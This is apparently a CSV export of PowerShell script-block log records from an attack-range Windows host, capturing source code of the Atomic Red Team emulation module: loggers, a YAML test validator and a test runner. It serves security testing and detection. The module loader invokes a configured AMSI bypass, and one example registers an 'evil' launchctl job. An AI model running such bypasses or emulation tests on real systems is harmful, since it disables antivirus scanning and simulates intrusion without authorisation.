        'exit-code'  = $res.ExitCode
        'is-timeout' = $res.IsTimeout
        'output'     = @()
    }

    $stdOutContents = $res.StandardOutput
    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {
        $stdOutContents = $stdOutContents.ToString()
    }

    $outputStdConsole = [PSCustomObject]@{
        content = $stdOutContents
        level   = ""STDOUT""
        type    = ""console""
    }

    $stdErrContents = $res.ErrorOutput
    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {
        $stdErrContents = $stdErrContents.ToString()
    }

    $outputErrConsole = [PSCustomObject]@{
        content = $stdErrContents
        level   = ""STDERR""
        type    = ""console""
    }

    [bool] $foundOutput = $false
    if ($res.StandardOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputStdConsole
    }

    if ($res.ErrorOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputErrConsole
    }

    if (!$foundOutput) {
        $emptyOutput = [PSCustomObject]@{
            content = """"
            level   = ""STDOUT""
            type    = ""console""
        }
        $step.output += $emptyOutput
    }

    $procedure = [PSCustomObject]@{
        'mitre-technique-id'    = $technique
        'procedure-name'        = $testName
        'procedure-id'          = $procedureId
        'procedure-description' = $testDescription
        order                   = $testNum
        steps                   = @()
    }

    $procedure.steps += $step

    $script:attireLog.procedures += $procedure
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {
    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')
    #$script:attireLog | Export-Csv -Path ""attireLogObject.csv""
    $content = ($script:attireLog | ConvertTo-Json -Depth 12)
    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False
    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)
    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII
    $script:attireLog = [PSCustomObject]@{
        'attire-version' = '1.1'
        'execution-data' = ''
        procedures       = @()
    }
}

function Resolve-NonexistantPath($File) {
    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error

    if (-not($Path)) {
        $Path = $error[0].TargetObject
    }

    return $Path
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710527","1",", Get","Get [Score: 1]","1699","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    # send syslog message if a syslog server is defined in Public/config.ps1
    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        $jsonMsg = $msg | ConvertTo-Json -Compress
        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity ""Informational"" -Facility ""daemon"" -Transport $artConfig.syslogProtocol
    }
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710530","1",", Get","Get [Score: 1]","1654","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {
    if ($isWindows -and -not [System.Diagnostics.EventLog]::Exists('Atomic Red Team')) {
        New-EventLog -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team""
    }
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    Write-EventLog  -Source ""Applications and Services Logs"" -LogName ""Atomic Red Team"" -EventID 3001 -EntryType Information -Message $msg -Category 1 -RawData 10, 20
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710533","1",", Get","Get [Score: 1]","847","#requires -Version 5.0

# execute amsi bypass if configured to use one
if([bool]$artConfig.absb -and ($artConfig.OS -eq ""windows"")){
    $artConfig.absb.Invoke()
}

#Get public and private function definition files.
$Public = @( Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )
$Private = @( Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -Recurse -Exclude ""AtomicClassSchema.ps1"" -ErrorAction SilentlyContinue )

# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)
. ""$PSScriptRoot\Private\AtomicClassSchema.ps1""

#Dot source the files
Foreach ($import in @($Public + $Private)) {
    Try {
        . $import.fullname
    }
    Catch {
        Write-Error -Message ""Failed to import function $($import.fullname): $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710539","1",", Get","Get [Score: 1]","14843","filter Get-AtomicTechnique {
    <#
    .SYNOPSIS

    Retrieve and validate an atomic technique.

    .DESCRIPTION

    Get-AtomicTechnique retrieves and validates one or more atomic techniques. Get-AtomicTechnique supports retrieval from YAML files or from a raw YAML string.

    This function facilitates the following use cases:

    1) Validation prior to execution of atomic tests.
    2) Writing code to reason over one or more atomic techniques/tests.
    3) Representing atomic techniques/tests in a format that is more conducive to PowerShell. ConvertFrom-Yaml returns a large, complicated hashtable that is difficult to work with and reason over. Get-AtomicTechnique helps abstract those challenges away.
    4) Representing atomic techniques/tests in a format that can be piped directly to ConvertTo-Yaml.

    .PARAMETER Path

    Specifies the path to an atomic technique YAML file. Get-AtomicTechnique expects that the file extension be .yaml or .yml and that it is well-formed YAML content.

    .PARAMETER Yaml

    Specifies a single string consisting of raw atomic technique YAML.

    .EXAMPLE

    Get-ChildItem -Path C:\atomic-red-team\atomics\* -Recurse -Include 'T*.yaml' | Get-AtomicTechnique

    .EXAMPLE

    Get-Item C:\atomic-red-team\atomics\T1117\T1117.yaml | Get-AtomicTechnique

    .EXAMPLE

    Get-AtomicTechnique -Path C:\atomic-red-team\atomics\T1117\T1117.yaml

    .EXAMPLE

    $Yaml = @'
    ---
    attack_technique: T1152
    display_name: Launchctl

    atomic_tests:
    - name: Launchctl
      description: |
        Utilize launchctl

      supported_platforms:
        - macos

      executor:
        name: sh
        command: |
          launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
    '@

    Get-AtomicTechnique -Yaml $Yaml

    .INPUTS

    System.IO.FileInfo

    The output of Get-Item and Get-ChildItem can be piped directly into Get-AtomicTechnique.

    .OUTPUTS

    AtomicTechnique

    Outputs an object representing a parsed and validated atomic technique.
    #>

    [CmdletBinding(DefaultParameterSetName = 'FilePath')]
    [OutputType([AtomicTechnique])]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName, ParameterSetName = 'FilePath')]
        [String]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ -Include '*.yaml', '*.yml' })]
        $Path,

        [Parameter(Mandatory, ParameterSetName = 'Yaml')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Yaml
    )


    switch ($PSCmdlet.ParameterSetName) {
        'FilePath' {
            $ResolvedPath = Resolve-Path -Path $Path

            $YamlContent = Get-Content -Path $ResolvedPath -Raw
            $ErrorStringPrefix = ""[$($ResolvedPath)]""
        }

        'Yaml' {
            $YamlContent = $Yaml
            $ErrorStringPrefix = ''
        }
    }

    $ParsedYaml = $null

    $ValidSupportedPlatforms = @('windows', 'macos', 'linux', 'office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
    $ValidInputArgTypes = @('Path', 'Url', 'String', 'Integer', 'Float')
    $ValidExecutorTypes = @('command_prompt', 'sh', 'bash', 'powershell', 'manual', 'aws', 'az', 'gcloud', 'kubectl')

    # ConvertFrom-Yaml will throw a .NET exception rather than a PowerShell error.
    # Capture the exception and convert to PowerShell error so that the user can decide
    # how to handle the error.
    try {
        [Hashtable] $ParsedYaml = ConvertFrom-Yaml -Yaml $YamlContent
    }
    catch {
        Write-Error $_
    }

    if ($ParsedYaml) {
        # The document was well-formed YAML. Now, validate against the atomic red schema

        $AtomicInstance = [AtomicTechnique]::new()

        if (-not $ParsedYaml.Count) {
            Write-Error ""$ErrorStringPrefix YAML file has no elements.""
            return
        }

        if (-not $ParsedYaml.ContainsKey('attack_technique')) {
            Write-Error ""$ErrorStringPrefix 'attack_technique' element is required.""
            return
        }

        $AttackTechnique = $null

        if ($ParsedYaml['attack_technique'].Count -gt 1) {
            # An array of attack techniques are supported.
            foreach ($Technique in $ParsedYaml['attack_technique']) {
                if (""$Technique"" -notmatch '^(?-i:T\d{4}(\.\d{3}){0,1})$') {
                    Write-Warning ""$ErrorStringPrefix Attack technique: $Technique. Each attack technique should start with the letter 'T' followed by a four digit number.""
                }

                [String[]] $AttackTechnique = $ParsedYaml['attack_technique']
            }
        }
        else {
            if ((-not ""$($ParsedYaml['attack_technique'])"".StartsWith('T'))) {
                # If the attack technique is a single entry, validate that it starts with the letter T.
                Write-Warning ""$ErrorStringPrefix Attack technique: $($ParsedYaml['attack_technique']). Attack techniques should start with the letter T.""
            }

            [String] $AttackTechnique = $ParsedYaml['attack_technique']
        }

        $AtomicInstance.attack_technique = $AttackTechnique

        if (-not $ParsedYaml.ContainsKey('display_name')) {
            Write-Error ""$ErrorStringPrefix 'display_name' element is required.""
            return
        }

        if (-not ($ParsedYaml['display_name'] -is [String])) {
            Write-Error ""$ErrorStringPrefix 'display_name' must be a string.""
            return
        }

        $AtomicInstance.display_name = $ParsedYaml['display_name']

        if (-not $ParsedYaml.ContainsKey('atomic_tests')) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is required.""
            return
        }

        if (-not ($ParsedYaml['atomic_tests'] -is [System.Collections.Generic.List`1[Object]])) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element must be an array.""
            return
        }

        $AtomicTests = [AtomicTest[]]::new($ParsedYaml['atomic_tests'].Count)

        if (-not $ParsedYaml['atomic_tests'].Count) {
            Write-Error ""$ErrorStringPrefix 'atomic_tests' element is empty - you have no tests.""
            return
        }

        for ($i = 0; $i -lt $ParsedYaml['atomic_tests'].Count; $i++) {
            $AtomicTest = $ParsedYaml['atomic_tests'][$i]

            $AtomicTestInstance = [AtomicTest]::new()

            $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'

            if (-not $AtomicTest.ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element is required.""
                return
            }

            if (-not ($AtomicTest['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix 'atomic_tests[$i].name' element must be a string.""
                return
            }

            $AtomicTestInstance.name = $AtomicTest['name']
            $AtomicTestInstance.auto_generated_guid = $AtomicTest['auto_generated_guid']

            if (-not $AtomicTest.ContainsKey('description')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element is required.""
                return
            }

            if (-not ($AtomicTest['description'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description' element must be a string.""
                return
            }

            $AtomicTestInstance.description = $AtomicTest['description']

            if (-not $AtomicTest.ContainsKey('supported_platforms')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element is required.""
                return
            }

            if (-not ($AtomicTest['supported_platforms'] -is [System.Collections.Generic.List`1[Object]])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms' element must be an array.""
                return
            }

            foreach ($SupportedPlatform in $AtomicTest['supported_platforms']) {
                if ($ValidSupportedPlatforms -cnotcontains $SupportedPlatform) {
                    Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].supported_platforms': '$SupportedPlatform' must be one of the following: $($ValidSupportedPlatforms -join ', ').""
                }
            }

            $AtomicTestInstance.supported_platforms = $AtomicTest['supported_platforms']

            $Dependencies = $null

            if ($AtomicTest['dependencies'].Count) {
                $Dependencies = [AtomicDependency[]]::new($AtomicTest['dependencies'].Count)
                $j = 0

                # dependencies are optional and there can be multiple
                foreach ($Dependency in $AtomicTest['dependencies']) {
                    $DependencyInstance = [AtomicDependency]::new()

                    if (-not $Dependency.ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element is required.""
                        return
                    }

                    if (-not ($Dependency['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].description' element must be a string.""
                        return
                    }

                    $DependencyInstance.description = $Dependency['description']
                    $StringsWithPotentialInputArgs.Add($Dependency['description'])

                    if (-not $Dependency.ContainsKey('prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.prereq_command = $Dependency['prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['prereq_command'])

                    if (-not $Dependency.ContainsKey('get_prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['get_prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])

                    $Dependencies[$j] = $DependencyInstance

                    $j++
                }

                $AtomicTestInstance.dependencies = $Dependencies
            }

            if ($AtomicTest.ContainsKey('dependency_executor_name')) {
                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').""
                    return
                }

                if ($null -eq $AtomicTestInstance.Dependencies) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.""
                }

                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']
            }

            $InputArguments = $null

            # input_arguments is optional
            if ($AtomicTest.ContainsKey('input_arguments')) {
                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {
                    $AtomicTest['input_arguments'].GetType().FullName
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.""
                    return
                }

                if (-not ($AtomicTest['input_arguments'].Count)) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.""
                    return
                }

                $InputArguments = @{}

                $j = 0

                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {

                    $InputArgument = [AtomicInputArgument]::new()

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.""
                        return
                    }

                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.""
                        return
                    }

                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.""
                        return
                    }

                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:55 PM","35710663","1",", Get","Get [Score: 1]","6031","# Attire-ExecutionLogger.psm1
# Copyright 2023 Security Risk Advisors

# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software),
# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

$script:attireLog = [PSCustomObject]@{
    'attire-version' = '1.1'
    'execution-data' = ''
    'procedures'     = @()
}

function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

    $ipAddress = Get-PreferredIPAddress $isWindows

    if ($targetUser -isnot [string]) {
        if ([bool]($targetUser.PSobject.Properties.name -match ""^value$"")) {
            $targetUser = $targetUser.value
        }
        else {
            $targetUser = $targetUser.ToString()
        }
    }
    if ($targetHostname -isnot [string]) {
        if ([bool]($targetHostname.PSobject.Properties.name -match ""^value$"")) {
            $targetHostname = $targetHostname.value
        }
        else {
            $targetHostname = $targetHostname.ToString()
        }
    }

    $target = [PSCustomObject]@{
        user = $targetUser
        host = $targetHostname
        ip   = $ipAddress
        path = $Env:PATH
    }

    $guid = New-Guid
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)
    $executionId = [Convert]::ToBase64String($bytes)

    $executionCategory = [PSCustomObject]@{
        'name'         = ""Atomic Red Team""
        'abbreviation' = ""ART""
    }

    $executionData = [PSCustomObject]@{
        'execution-source'   = ""Invoke-Atomicredteam""
        'execution-id'       = $executionId
        'execution-category' = $executionCategory
        'execution-command'  = $commandLine
        target               = $target
        'time-generated'     = """"
    }

    $script:attireLog.'execution-data' = $executionData
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {

    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()
    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()

    $procedureId = [PSCustomObject]@{
        type = ""guid""
        id   = $testGuid
    }

    $step = [PSCustomObject]@{
        'order'      = 1
        'time-start' = $startTime
        'time-stop'  = $stopTime
        'executor'   = $testExecutor
        'command'    = $command
        'process-id' = $res.ProcessId
        'exit-code'  = $res.ExitCode
        'is-timeout' = $res.IsTimeout
        'output'     = @()
    }

    $stdOutContents = $res.StandardOutput
    if (($stdOutContents -isnot [string]) -and ($null -ne $stdOutContents)) {
        $stdOutContents = $stdOutContents.ToString()
    }

    $outputStdConsole = [PSCustomObject]@{
        content = $stdOutContents
        level   = ""STDOUT""
        type    = ""console""
    }

    $stdErrContents = $res.ErrorOutput
    if (($stdErrContents -isnot [string]) -and ($null -ne $stdErrContents)) {
        $stdErrContents = $stdErrContents.ToString()
    }

    $outputErrConsole = [PSCustomObject]@{
        content = $stdErrContents
        level   = ""STDERR""
        type    = ""console""
    }

    [bool] $foundOutput = $false
    if ($res.StandardOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputStdConsole
    }

    if ($res.ErrorOutput.length -gt 0) {
        $foundOutput = $true
        $step.output += $outputErrConsole
    }

    if (!$foundOutput) {
        $emptyOutput = [PSCustomObject]@{
            content = """"
            level   = ""STDOUT""
            type    = ""console""
        }
        $step.output += $emptyOutput
    }

    $procedure = [PSCustomObject]@{
        'mitre-technique-id'    = $technique
        'procedure-name'        = $testName
        'procedure-id'          = $procedureId
        'procedure-description' = $testDescription
        order                   = $testNum
        steps                   = @()
    }

    $procedure.steps += $step

    $script:attireLog.procedures += $procedure
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {
    $script:attireLog.'execution-data'.'time-generated' = (Get-Date (Get-Date).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z')
    #$script:attireLog | Export-Csv -Path ""attireLogObject.csv""
    $content = ($script:attireLog | ConvertTo-Json -Depth 12)
    #$Utf8NoBom = New-Object System.Text.UTF8Encoding $False
    [System.IO.File]::WriteAllLines((Resolve-NonexistantPath($logPath)), $content)
    #Out-File -FilePath $logPath -InputObject ($script:attireLog | ConvertTo-Json -Depth 12) -Append -Encoding ASCII
    $script:attireLog = [PSCustomObject]@{
        'attire-version' = '1.1'
        'execution-data' = ''
        procedures       = @()
    }
}

function Resolve-NonexistantPath($File) {
    $Path = Resolve-Path $File -ErrorAction SilentlyContinue -ErrorVariable error

    if (-not($Path)) {
        $Path = $error[0].TargetObject
    }

    return $Path
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710666","1",", Get","Get [Score: 1]","1699","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    # send syslog message if a syslog server is defined in Public/config.ps1
    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        $jsonMsg = $msg | ConvertTo-Json -Compress
        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity ""Informational"" -Facility ""daemon"" -Transport $artConfig.syslogProtocol
    }
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710585","1",", Get","Get [Score: 1]","1000","function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {
    $FailureReasons = New-Object System.Collections.ArrayList
    if ( $test.executor.elevation_required -and -not $isElevated) {
        $FailureReasons.add(""Elevation required but not provided`n"") | Out-Null
    }
    foreach ($dep in $test.dependencies) {
        $executor = Get-PrereqExecutor $test
        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
        if ($executor -ne ""powershell"") { $final_command = ($final_Command.trim()).Replace(""`n"", "" && "") }
        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session
        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
        if ($res.ExitCode -ne 0) {
            $FailureReasons.add($description) | Out-Null
        }
    }
    $FailureReasons
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710672","1",", Get","Get [Score: 1]","847","#requires -Version 5.0

# execute amsi bypass if configured to use one
if([bool]$artConfig.absb -and ($artConfig.OS -eq ""windows"")){
    $artConfig.absb.Invoke()
}

#Get public and private function definition files.
$Public = @( Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )
$Private = @( Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -Recurse -Exclude ""AtomicClassSchema.ps1"" -ErrorAction SilentlyContinue )

# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)
. ""$PSScriptRoot\Private\AtomicClassSchema.ps1""

#Dot source the files
Foreach ($import in @($Public + $Private)) {
    Try {
        . $import.fullname
    }
    Catch {
        Write-Error -Message ""Failed to import function $($import.fullname): $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710692","1",", Get","Get [Score: 1]","12097","ed_platforms) {
                if ($cloud -contains $platform) {
                    return $(Test-Path -Path $pathToTerraform)
                }
            }
            return $false
        }

        function Build-TFVars($AT, $testCount, $InputArgs) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            if ($InputArgs) {
                $destinationVarsPath = Join-Path ""$tmpDirPath"" ""terraform.tfvars.json""
                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath
            }
        }

        function Remove-TerraformFiles($AT, $testCount) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            Write-Host $tmpDirPath
            $tfStateFile = Join-Path $tmpDirPath ""terraform.tfstate""
            $tfvarsFile = Join-Path $tmpDirPath ""terraform.tfvars.json""
            if ($(Test-Path $tfvarsFile)) {
                Remove-Item -LiteralPath $tfvarsFile -Force
            }
            if ($(Test-Path $tfStateFile)) {
                (Get-ChildItem -Path $tmpDirPath).Fullname -match ""terraform.tfstate*"" | Remove-Item -Force
            }
        }

        function Invoke-AtomicTestSingle ($AT) {

            $AT = $AT.ToUpper()
            $pathToYaml = Join-Path $PathToAtomicsFolder ""\$AT\$AT.yaml""
            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }
            else {
                Write-Host -Fore Red ""ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter""
                return
            }
            $techniqueCount = 0
            $numAtomicsApplicableToPlatform = 0
            $techniqueString = """"
            foreach ($technique in $AtomicTechniqueHash) {
                $techniqueString = $technique.attack_technique[0]
                $techniqueCount++

                $props = @{
                    Activity        = ""Running $($technique.display_name.ToString()) Technique""
                    Status          = 'Progress:'
                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)
                }
                Write-Progress @props

                Write-Debug -Message ""Gathering tests for Technique $technique""

                $testCount = 0
                foreach ($test in $technique.atomic_tests) {

                    Write-Verbose -Message 'Determining tests for target platform'

                    $testCount++

                    if (-not $anyOS) {
